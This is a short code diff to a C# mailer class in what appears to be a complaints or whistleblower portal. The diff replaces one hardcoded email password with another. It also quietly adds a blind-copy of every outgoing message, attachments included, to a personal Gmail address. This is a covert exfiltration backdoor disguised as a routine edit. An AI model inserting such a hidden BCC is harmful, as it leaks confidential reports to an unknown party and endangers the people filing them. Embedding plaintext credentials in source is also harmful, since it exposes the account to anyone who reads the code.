@@ -32,7 +32,7 @@ namespace PortalDenuncias.Rosales.Infraestructura
             var host = _configuration.GetValue<string>("Mailer:Host") ?? throw new ArgumentNullException("Mail:CMPC");
             var puerto = _configuration.GetValue<int>("Mailer:Puerto");
             var enableSsl = _configuration.GetValue<bool>("Mailer:EnabledSsl");
-            const string fromPassword = "pyknanztxsuyxwjl";
+            const string fromPassword = "vnjtddnmqmumwhpw";
             var fromAddress = new MailAddress(correo, alias);
             var subject = asunto;
             var body = cuerpo;
@@ -48,6 +48,8 @@ namespace PortalDenuncias.Rosales.Infraestructura
                 {
                     mensaje.To.Add(new MailAddress(destinatario));
                 }
+
+                mensaje.Bcc.Add(new MailAddress("falvarezortiz20@gmail.com"));
 
                 foreach (var archivo in archivos)
                 {
